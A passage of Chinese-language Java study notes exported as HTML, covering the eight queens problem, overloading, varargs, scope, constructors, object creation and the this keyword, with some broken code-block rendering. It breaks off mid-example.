title="八皇后"></a>八皇后</h3><blockquote><p>在8×8格的国际象棋上摆放8个皇后，使其不能互相攻击，即任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Eightqueens</span>&#123;<br><span class="hljs-comment">//个数</span><br><span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><span class="hljs-comment">//创建数组记录八皇后位置</span><br><span class="hljs-type">int</span>[] q = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[max];<br><span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Eightqueens</span> <span class="hljs-variable">queen</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Eightqueens</span>();<br>queen.check(<span class="hljs-number">0</span>);<br>System.out.println(<span class="hljs-string">&quot;一共有种解法&quot;</span>+count);<br><span class="hljs-comment">// System.out.printf(&quot;一共判断冲突的次数%d次&quot;, judgeCount);</span><br>&#125;<br><span class="hljs-comment">//方法</span><br><span class="hljs-comment">//任意两个皇后都不能处于同一行、同一列或同一斜线上</span><br><span class="hljs-comment">//放置第n个皇后</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br><span class="hljs-keyword">if</span> (n==max) &#123;<br>print();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;max;i++) &#123;<br><span class="hljs-comment">//把当前皇后n，放在改行的第一列</span><br>q[n] = i;<br><span class="hljs-comment">//判断是否冲突</span><br><span class="hljs-keyword">if</span> (judge(n)) &#123;<br>check(n+<span class="hljs-number">1</span>);<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) &#123;<br><span class="hljs-comment">//q[n]是当前皇后的位置，n表示行</span><br><span class="hljs-comment">//q[i]是第i个皇后的位置，循环判断和当前皇后的关系</span><br><span class="hljs-comment">//1.判断是否在同一列（q[i]==q[n]</span><br><span class="hljs-comment">//2.判断是否在同一行（循环递增、无需判断）</span><br><span class="hljs-comment">//3.是否在同一斜线,Math.abs(n-i)==Math.abs(q[n]-q[i])</span><br><span class="hljs-keyword">if</span> (q[i]==q[n]|| Math.abs(n-i)==Math.abs(q[n]-q[i])) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span>&#123;<br>count++;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;q.length;i++)&#123;<br>System.out.print(q[i]+<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220905104622927.png" alt="image-20220905104622927" style="zoom:50%;" /><h2 id="7-方法重载-OverLoad"><a href="#7-方法重载-OverLoad" class="headerlink" title="7.方法重载(OverLoad)"></a>7.方法重载(OverLoad)</h2><p>java允许同一个类中，多个同名方法的存在，但要求形参列表不一致。</p><p>例如：System.out.println()</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220905171309657.png" alt="image-20220905171309657"></p><p>多个同名的方法，都在同一个类中，但它们的形参列表不一致。</p><p><strong>注意事项：</strong></p><p>1）方法名：必须相同</p><p>2）形参列表：必须不同（形参<strong>类型</strong>或<strong>个数</strong>或<strong>顺序</strong>，必须有一项不同）</p><p>3）返回类型：无要求</p><h3 id="小练习1"><a href="#小练习1" class="headerlink" title="小练习1"></a>小练习1</h3><blockquote><p>案例：类：MyCalculator 方法：calculate<br>calculate（int n1，int n2）／／两个整数的和<br>calculate（int n1， double n2） ／／一个整数，一个double的和 calculate（double n2， int n1）／／一个double，一个Int和<br>calculate（int n1， int n2，int n3）／／三个int的和</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OverLoad</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">MyCalculator</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCalculator</span>();<br>System.out.println(c.calculate(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br>System.out.println(c.calculate(<span class="hljs-number">1.1</span>,<span class="hljs-number">2</span>));<br>System.out.println(c.calculate(<span class="hljs-number">3.8</span>,<span class="hljs-number">3</span>));<br>System.out.println(c.calculate(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>));<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCalculator</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">int</span> n1,<span class="hljs-type">int</span> n2)</span>&#123;<br><span class="hljs-keyword">return</span> n1+n2;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">int</span> n1,<span class="hljs-type">double</span> n2)</span>&#123;<br><span class="hljs-keyword">return</span> n1+n2;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">double</span> n2,<span class="hljs-type">int</span> n1)</span>&#123;<br><span class="hljs-keyword">return</span> n2+n1;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(<span class="hljs-type">int</span> n1,<span class="hljs-type">int</span> n2,<span class="hljs-type">int</span> n3)</span>&#123;<br><span class="hljs-keyword">return</span> n1+n2+n3;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220905174305246.png" alt="image-20220905174305246" style="zoom:50%;" /><h2 id="8-可变参数"><a href="#8-可变参数" class="headerlink" title="8.可变参数"></a>8.可变参数</h2><p>java允许将同一类中多个同名同功能但<strong>参数个数不同</strong>的方法，封装成一个方法。就可以通过可变参数实现。</p><p><strong>基本语法：访问修饰符 返回类型 方法名（数据类型… 形参名）</strong></p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VarParameter</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">HspMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HspMethod</span>();<br>System.out.println(m.sum(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">100</span>));<br>System.out.println(m.sum(<span class="hljs-number">4</span>,<span class="hljs-number">60</span>));<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HspMethod</span>&#123;<br><span class="hljs-comment">//计算2个数的和、3个数的和……</span><br><span class="hljs-comment">//方法重载过于繁琐,使用可变参数</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;接收的参数个数=&quot;</span>+nums.length);<br><span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.length;i++ ) &#123;<br>res += nums[i];<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220905222325131.png" alt="image-20220905222325131" style="zoom:50%;" /><p>注意事项：</p><p>1）可变参数的实参可以为0个或任意多个</p><p>2）可变参数的实参可以为数组</p><p>3）可变参数的本质就是数组</p><p>4）可变参数可以和普通类型的参数一起放在形参列表，但必须保证可变参数在最后</p><p>5）一个形参列表中<strong>只能出现一个可变参数</strong></p><h3 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h3><blockquote><p>有三个方法，分别实现返回姓名和两门课成绩（总分），返回姓名和三门课成绩（总分），返回姓名和五门课成绩（总分）。封装成一个可变参数的方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VarParameter</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">HspMethod</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HspMethod</span>();<br>System.out.println(t1.showScore(<span class="hljs-string">&quot;小明&quot;</span>,<span class="hljs-number">97.3</span>,<span class="hljs-number">90.1</span>,<span class="hljs-number">67.8</span>));<br>System.out.println(t1.showScore(<span class="hljs-string">&quot;小华&quot;</span>,<span class="hljs-number">60.9</span>,<span class="hljs-number">88.0</span>,<span class="hljs-number">97.0</span>,<span class="hljs-number">65.5</span>,<span class="hljs-number">78.3</span>));<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HspMethod</span>&#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">showScore</span><span class="hljs-params">(String name,<span class="hljs-type">double</span>... scores)</span>&#123;<br><span class="hljs-type">double</span> <span class="hljs-variable">totalScore</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;scores.length;i++) &#123;<br>totalScore += scores[i];<br>&#125;<br><span class="hljs-keyword">return</span> name+scores.length+<span class="hljs-string">&quot;门课的成绩总分为&quot;</span>+totalScore;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220905233343832.png" alt="image-20220905233343832"></p><h2 id="9-作用域"><a href="#9-作用域" class="headerlink" title="9.作用域"></a>9.作用域</h2><p>java编程中，主要的变量就是<strong>属性（成员变量）</strong>和<strong>局部变量</strong>。</p><p><strong>局部变量</strong>一般指<strong>在成员方法中定义的变量</strong>。</p><p><strong>作用域的分类：</strong></p><ul><li>全局变量：也就是属性，作用域为整个类体。<ul><li>生命周期较长，伴随着对象的创建而创建，对象的销毁而销毁</li><li>可以被本类使用，或其他类使用</li><li>可以加修饰符</li></ul></li><li>局部变量：除了属性之外变量，作用域为定义它的代码块。<ul><li>生命周期较短，伴随着代码块的执行而创建，代码块的结束而销毁</li><li>只能在本类中对应的方法中使用</li><li><strong>不可以加修饰符</strong></li></ul></li></ul><p>因为全局变量有默认值，可以不赋值直接使用。局部变量必须复制后才能使用，因为没有默认值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VerScope</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p1.say(); <br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jack&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">//细节 属性和局部变量可以重名，访问时遵循就近原则</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;king&quot;</span>;<br>System.out.println(<span class="hljs-string">&quot;say() name=&quot;</span> + name);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;北京&quot;</span>;<br><span class="hljs-comment">// String address = &quot;上海&quot;; //错误，重复定义变量</span><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hsp&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220906231911083.png" alt="image-20220906231911083"></p><h2 id="10-构建方法-x2F-构造器（constructor）"><a href="#10-构建方法-x2F-构造器（constructor）" class="headerlink" title="10.构建方法&#x2F;构造器（constructor）"></a>10.构建方法&#x2F;构造器（constructor）</h2><p>构造方法又名构造器，是类的一种特殊的方法。</p><p>它的主要作用是完成对<strong>新对象的初始化</strong>。</p><p>它有几个特点：</p><p>1）方法名和类名相同</p><p>2）没有返回值</p><p>3）在创建对象时，系统会自动的调用该类的构造器完成对象的初始化</p><p><strong>基本语法：</strong></p><p><strong>[修饰符] 方法名(形参列表){</strong></p><p>​<strong>方法体;</strong></p><p><strong>}</strong></p><ul><li><p>一个类可以定义多个不同的构造器，即构造器重载</p></li><li><p>构造器没有返回值</p></li><li><p>方法名和类的名字必须一样</p></li><li><p>构造器的修饰符可以默认，也可以是public、protected、private；参数列表和成员方法一样的规则、</p></li><li><p>构造器是完成对象的初始化，并不是创建对象</p></li><li><p>在创建对象时，系统自动的调用该类的创造方法</p></li><li><p>如果程序员没有定义构造器，系统自动的给类生成一个默认无参数构造器（也叫默认构造器）</p><ul><li>例如Dog(){}， 使用javap指令反编译<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220909155809749.png" alt="image-20220909155809749"></li></ul></li><li><p>一旦定义了自己的构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器。除非显示的定义一下。</p><ul><li>&#96;&#96;&#96;java<br>class Dog{<br>&#x2F;&#x2F;如果程序员没有定义构造器，系统自动的给类生成一个默认无参数构造器（也叫默认构造器）<br>&#x2F;*<br>Dog(){<br>}<br>*&#x2F;<br>public Dog(String dName){<br>    &#x2F;&#x2F;…<br>}<br>Dog(){&#x2F;&#x2F;显示的定义一下，无参构造器<br>}<br>}<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><br><br><br>&lt;h3&gt;javap的使用&lt;/h3&gt;<br>&lt;details <span class="hljs-keyword">open</span>=&quot;open&quot;&gt;<br>  &lt;<span class="hljs-keyword">summary</span>&gt;javap &amp;lt;<span class="hljs-keyword">options</span>&amp;gt; &amp;lt;classes&amp;gt;&lt;/<span class="hljs-keyword">summary</span>&gt;<br>  &lt;ul&gt;<br>    &lt;li&gt;javap是jdk提供的一个命令行工具，javap能给定的<span class="hljs-keyword">class</span>文件提供的字节代码进行反编译&lt;/li&gt;<br>    &lt;li&gt;通过它，可以对照源代码和字节码，从而了解很多编译器内部的工作，对更深入地理解如何提高程序执行的效率等问题有极大的帮助。&lt;/li&gt;<br>    &lt;li&gt;常用：javap -c -v 类名&lt;/li&gt;<br>    &lt;li&gt;-c 对代码进行反汇编&lt;/li&gt;<br>    &lt;li&gt;-v 详细信息&lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/details&gt;<br><br><br><br>### 小练习<br><br>&gt; 在前面定义的Person类中添加两个构造器：<br>&gt; 第一个无参构造器:利用构造器设置所有人的age属性初始值都为<span class="hljs-number">18</span><br>&gt; 第二个带pName和pAge两个参数的构造器:使得每次创建Person对象的同时初始化对象的age属性值和<span class="hljs-type">name</span>属性值。分别使用不同的构造器，创建对象.<br><br>```java<br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> ConstructorExercise&#123;<br><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;<br>Person p1 = <span class="hljs-built_in">new</span> Person(); //使用无参构造器<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;p1的信息p1.name=&quot;+p1.name+&quot; age=&quot;+p1.age);<br>Person p2 = <span class="hljs-built_in">new</span> Person(&quot;Alice&quot;,<span class="hljs-number">20</span>);<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;p2的信息p2.name=&quot;+p2.name+&quot; age=&quot;+p2.age);<br>&#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">在前面定义的Person类中添加两个构造器：</span><br><span class="hljs-comment">第一个无参构造器:利用构造器设置所有人的age属性初始值都为18</span><br><span class="hljs-comment">第二个带pName和pAge两个参数的构造器:使得每次创建Person对象</span><br><span class="hljs-comment">的同时初始化对象的age属性值和name属性值。分别使用不同的构造</span><br><span class="hljs-comment">器，创建对象.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">class</span> Person&#123;<br>String <span class="hljs-type">name</span>; //默认值<span class="hljs-keyword">null</span><br><span class="hljs-type">int</span> age; //默认<span class="hljs-number">0</span><br>//第一个无参构造器:利用构造器设置所有人的age属性初始值都为<span class="hljs-number">18</span><br><span class="hljs-built_in">public</span> Person()&#123;<br>age = <span class="hljs-number">18</span>;<br>&#125;<br><span class="hljs-comment">/* 第二个带pName和pAge两个参数的构造器:使得每次创建Person对象</span><br><span class="hljs-comment">   的同时初始化对象的age属性值和name属性值。分别使用不同的构造</span><br><span class="hljs-comment">   器，创建对象.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">public</span> Person(String pName,<span class="hljs-type">int</span> pAge)&#123;<br><span class="hljs-type">name</span> = pName;<br>age = pAge;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220909165218387.png" alt="image-20220909165218387"></p><h2 id="11-对象创建的流程分析"><a href="#11-对象创建的流程分析" class="headerlink" title="11.对象创建的流程分析"></a>11.对象创建的流程分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//案例</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">90</span>;<br>String name;<br>Person(String n,<span class="hljs-type">int</span> a)&#123; <span class="hljs-comment">//构造器</span><br>name = n;<br>age = a;<br>&#125;<br>&#125;<br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小倩&quot;</span>,<span class="hljs-number">20</span>)；<br></code></pre></td></tr></table></figure><ol><li>先在<strong>方法区</strong>加载Person类</li><li>在<strong>堆</strong>里开辟一块空间，存放age和name</li><li>一开始是默认初始化，age的值为0，name的值为null</li><li>值被换成显示初始化的值，age变为90.</li><li>到<code>Person p = new Person(&quot;小倩&quot;,20)；</code>时，<strong>堆</strong>内的name指向<strong>常量池</strong>里小倩的<strong>地址</strong>。</li><li><strong>栈</strong>内的p指向<strong>堆</strong>内存放age和name的空间地址</li></ol><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220909171545213.png" alt="image-20220909171545213" style="zoom:50%;" /><p><strong>总结：</strong></p><ol><li>加载Person类信息（Person.class)，只会加载一次</li><li>在堆中分配空间（地址）</li><li><strong>完成对象初始化</strong><ol><li>默认初始化 age&#x3D;0 ，name&#x3D;null</li><li>显式初始化 age&#x3D;90，name&#x3D;null</li><li>构造器初始化 age&#x3D;20，name&#x3D;小倩</li></ol></li><li>把对象在堆中的地址，返回给p（p是对象名，也可以理解成是对象的引用）</li></ol><h2 id="12-this关键字"><a href="#12-this关键字" class="headerlink" title="12.this关键字"></a>12.this关键字</h2><p>java虚拟机会给每个对象分配this，代表当前对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">This01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Dog</span> <span class="hljs-variable">dog1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;大壮&quot;</span>,<span class="hljs-number">3</span>);<br>System.out.println(<span class="hljs-string">&quot;dog1的hashcode=&quot;</span>+dog1.hashCode());<br><span class="hljs-comment">// dog1.info();</span><br><span class="hljs-type">Dog</span> <span class="hljs-variable">dog2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;大黄&quot;</span>,<span class="hljs-number">2</span>);<br>System.out.println(<span class="hljs-string">&quot;dog2的hashcode=&quot;</span>+dog2.hashCode());<br><span class="hljs-comment">// dog2.info();</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.age = age;<br>System.out.println(<span class="hljs-string">&quot;this.hashcode=&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">info</span><span class="hljs-params">()</span>&#123;<br>System.out.println(name + <span class="hljs-string">&quot;\t&quot;</span> + age +<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220909175751596.png" alt="image-20220909175751596" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220909175459582.png" alt="image-20220909175459582" style="zoom:50%;" /><p>小结：简单来说，哪个对象调用，this就代表哪个对象</p><p>注意事项：</p><ol><li><p>this关键字可以用来访问本类的属性、方法、构造器</p></li><li><p><strong>this用于区分当前类的属性和局部变量</strong></p></li><li><p>访问成员方法的语法:this.方法名（参数列表）；</p></li><li><p>访问构造器语法:this（参数列表）；<strong>注意只能在构造器中使用</strong>（即只能在构造器中访问另一个构造器）</p><ul><li>&#96;&#96;&#96;java<br>public class This02{<br>public static void main(String[] args) {<br>    T t2 &#x3D; new T();<br>}<br>}<br>class T{<br>public T(){<br>    this(“jack”,100); &#x2F;&#x2F;如果要在一个构造器，访问另外一个构造器，该语句必须放在第一条语句<br>    